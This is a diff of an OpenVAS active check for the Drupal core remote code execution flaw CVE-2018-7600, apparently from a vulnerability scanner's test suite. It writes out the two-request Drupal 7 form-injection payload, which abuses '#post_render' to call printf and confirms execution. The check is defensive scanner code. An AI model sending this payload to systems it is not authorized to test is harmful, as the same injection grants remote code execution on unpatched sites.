@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_drupal_core_rce_vuln_SA-CORE-2018-002_active.nasl 9643 2018-04-27 07:20:03Z cfischer $
+# $Id: gb_drupal_core_rce_vuln_SA-CORE-2018-002_active.nasl 10103 2018-06-06 14:22:29Z cfischer $
 #
 # Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)
 #
@@ -29,11 +29,11 @@ CPE = 'cpe:/a:drupal:drupal';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108438");
-  script_version("$Revision: 9643 $");
+  script_version("$Revision: 10103 $");
   script_cve_id("CVE-2018-7600");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-27 09:20:03 +0200 (Fri, 27 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-06 16:22:29 +0200 (Wed, 06 Jun 2018) $");
   script_tag(name:"creation_date", value:"2018-04-14 13:29:22 +0200 (Sat, 14 Apr 2018)");
   script_name("Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)");
   script_category(ACT_GATHER_INFO);
@@ -126,31 +126,33 @@ foreach url( urls ) {
 
 # Drupal 7
 # This needs 2 requests (see e.g. https://github.com/FireFart/CVE-2018-7600/blob/master/poc.py)
-url = dir + "/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=printf&name%5B%23markup%5D="+ check +
-            "&name%5B%23typ";
-data = "form_id=user_pass&_triggering_element_name=name";
+url1 = dir + "/?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=printf&name%5B%23markup%5D="+ check +
+             "&name%5B%23typ";
+data1 = "form_id=user_pass&_triggering_element_name=name";
 
-req  = http_post_req( port:port, url:url, data:data,
+req  = http_post_req( port:port, url:url1, data:data1,
                       add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
 res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
 
 build_id = eregmatch(pattern: '<input type="hidden" name="form_build_id" value="([^"]+)" />', string: res);
 if (!isnull(build_id[1])) {
-  url = dir + "/?q=file%2Fajax%2Fname%2F%23value%2F" + build_id[1];
-  data = "form_build_id=" + build_id[1];
-  req  = http_post_req( port:port, url:url, data:data,
-                      add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
+  url2 = dir + "/?q=file%2Fajax%2Fname%2F%23value%2F" + build_id[1];
+  data2 = "form_build_id=" + build_id[1];
+  req  = http_post_req( port:port, url:url2, data:data2,
+                        add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
   res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
 
   # wz8rLLg_3Uie91Rg[{"command":"settings","settings":{"basePath":"...
   if( egrep( string:res, pattern:"^" + check + "\[\{" ) ) {
 
-    info['"HTTP POST" body'] = data;
-    info['URL'] = report_vuln_url( port:port, url:url, url_only:TRUE );
+    info['Req 1: "HTTP POST" body'] = data1;
+    info['Req 1: URL'] = report_vuln_url( port:port, url:url1, url_only:TRUE );
+    info['Req 2: "HTTP POST" body'] = data2;
+    info['Req 2: URL'] = report_vuln_url( port:port, url:url2, url_only:TRUE );
 
-    report  = 'By doing the following request:\n\n';
+    report  = 'By doing the following subsequent requests:\n\n';
     report += text_format_table( array:info ) + '\n';
-    report += 'it was possible to execute the "printf" command.';
+    report += 'it was possible to execute the "printf" command to return the data "' + check + '".';
     report += '\n\nResult:\n\n' + res;
 
     expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
